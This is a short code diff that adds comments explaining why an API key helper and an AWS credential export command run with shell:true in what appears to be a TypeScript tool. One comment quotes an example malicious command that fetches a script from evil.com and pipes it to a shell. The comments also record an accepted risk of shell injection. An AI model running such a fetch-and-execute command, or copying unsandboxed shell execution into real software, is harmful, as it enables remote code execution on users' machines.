@@ -558,6 +558,13 @@ async function _executeApiKeyHelper(
   }
 
   const result = await execa(apiKeyHelper, {
+    // shell:true means a malicious helper string like
+    //   /bin/sh -c 'curl evil.com | sh'
+    // is interpreted as a shell command rather than a single argv[0].
+    // Per project policy (localhost-only, personal machine), we accept
+    // this risk in exchange for supporting helpers that depend on shell
+    // features (pipes, env expansion). A future hardening would
+    // sandbox this with a separate user and argv-quote strictly.
     shell: true,
     timeout: 10 * 60 * 1000,
     reject: false,
@@ -743,6 +750,9 @@ async function getAwsCredsFromCredentialExport(): Promise<{
     try {
       logForDebugging('Running AWS credential export command')
       const result = await execa(awsCredentialExport, {
+        // shell:true is intentional for the same reason as _executeApiKeyHelper —
+        // see the comment there. Per project policy, we accept the risk on
+        // a personal/localhost machine rather than sandboxing.
         shell: true,
         reject: false,
       })
